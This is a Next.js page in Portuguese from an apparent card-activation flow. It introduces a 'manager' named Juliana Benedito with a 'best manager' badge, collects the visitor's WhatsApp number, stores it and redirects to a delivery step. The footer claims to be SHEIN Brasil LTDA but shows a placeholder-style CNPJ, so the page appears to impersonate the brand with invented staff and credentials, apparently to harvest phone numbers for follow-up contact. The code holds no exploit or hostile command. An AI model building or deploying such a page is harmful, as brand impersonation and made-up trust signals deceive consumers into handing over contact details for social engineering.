"use client"

import type React from "react"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import { Trophy } from "lucide-react"

export default function ManagerPage() {
  const [whatsapp, setWhatsapp] = useState("")
  const [isValid, setIsValid] = useState(false)
  const router = useRouter()

  // Função para formatar WhatsApp
  const formatWhatsApp = (value: string) => {
    // Remove tudo que não é número
    const numbers = value.replace(/\D/g, "")

    // Limita a 11 dígitos
    const limited = numbers.substring(0, 11)

    // Aplica a formatação (XX) XXXXX-XXXX
    if (limited.length <= 2) {
      return limited
    } else if (limited.length <= 7) {
      return `(${limited.substring(0, 2)}) ${limited.substring(2)}`
    } else {
      return `(${limited.substring(0, 2)}) ${limited.substring(2, 7)}-${limited.substring(7)}`
    }
  }

  // Função para validar WhatsApp (11 dígitos)
  const validateWhatsApp = (value: string) => {
    const numbers = value.replace(/\D/g, "")
    return numbers.length === 11
  }

  const handleWhatsAppChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatWhatsApp(e.target.value)
    setWhatsapp(formatted)
    setIsValid(validateWhatsApp(formatted))
  }

  const handleContinue = () => {
    if (isValid) {
      // Salva o WhatsApp no localStorage
      const numbers = whatsapp.replace(/\D/g, "")
      localStorage.setItem("whatsapp", numbers)

      // Redireciona para a próxima página
      router.push("/delivery-method")
    }
  }

  return (
    <div className="min-h-screen bg-[#f2f2f2] font-sans">
      <div className="px-5 py-5 max-w-2xl mx-auto">
        <div className="bg-white rounded-xl shadow-lg p-5">
          <h1 className="text-2xl font-bold text-gray-800 mb-3 text-center mt-0">Ótimo, quase lá!</h1>

          <p className="text-sm text-gray-600 mb-5 text-center leading-relaxed">
            Conheça sua Gerente, ela irá auxiliar na ativação do seu cartão e esclarecer todas as suas dúvidas!
          </p>

          <div className="bg-[#fff7db] border border-[#ffbf00] rounded-xl p-5 pb-3 mb-5">
            <div className="flex justify-center mb-3">
              <Image
                src="/gerente-juliana.png"
                alt="Foto da Gerente"
                width={120}
                height={120}
                className="rounded-full object-cover"
                style={{ border: "3px solid #ffbf00" }}
              />
            </div>

            <p className="text-gray-600 text-sm text-center mb-1">Gerente</p>
            <p className="text-[#ffbf00] font-bold text-lg text-center -mt-1 mb-2">Juliana Benedito</p>

            <div className="flex justify-center mt-0">
              <div className="bg-[#ffbf00] text-white px-3 py-1 rounded-full text-xs font-bold flex items-center">
                <Trophy className="w-3 h-3 mr-1" />
                Melhor gerente 2021-2024
              </div>
            </div>
          </div>

          <div className="flex items-center justify-center mb-2">
            <Image src="/whatsapp-icon.png" alt="WhatsApp" width={20} height={20} className="mr-3" />
            <input
              type="tel"
              className="flex h-10 w-full px-3 py-2 ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 md:text-sm border-0 border-b border-gray-300 rounded-none bg-transparent text-base font-sans focus:border-gray-400 focus:ring-0 flex-1"
              placeholder="Digite seu WhatsApp aqui"
              maxLength={15}
              style={{
                boxShadow: "none",
                borderTop: "none",
                borderLeft: "none",
                borderRight: "none",
                borderRadius: "0",
              }}
              value={whatsapp}
              onChange={handleWhatsAppChange}
            />
          </div>

          <button
            className={`inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 w-full font-bold py-4 px-6 rounded-lg text-base transition-colors ${
              isValid
                ? "bg-black text-white hover:bg-black/90"
                : "bg-gray-300 text-gray-500 cursor-not-allowed hover:bg-gray-300"
            }`}
            disabled={!isValid}
            onClick={handleContinue}
          >
            Continuar
          </button>
        </div>
      </div>

      <footer className="bg-[#f9f9f9] border-t border-[#eaeaea] px-4 py-6 text-center mt-12">
        <div className="max-w-2xl mx-auto">
          <p className="text-gray-600 text-xs mb-1 leading-tight">SHEIN Brasil LTDA | CNPJ: 12.345.678/0001-99</p>
          <p className="text-gray-600 text-xs mb-2 leading-tight">
            Av. Paulista, 1000 - Bela Vista, São Paulo - SP, 01310-100
          </p>
          <p className="text-gray-500 text-xs">© 2025 - Todos os direitos reservados</p>
        </div>
      </footer>
    </div>
  )
}
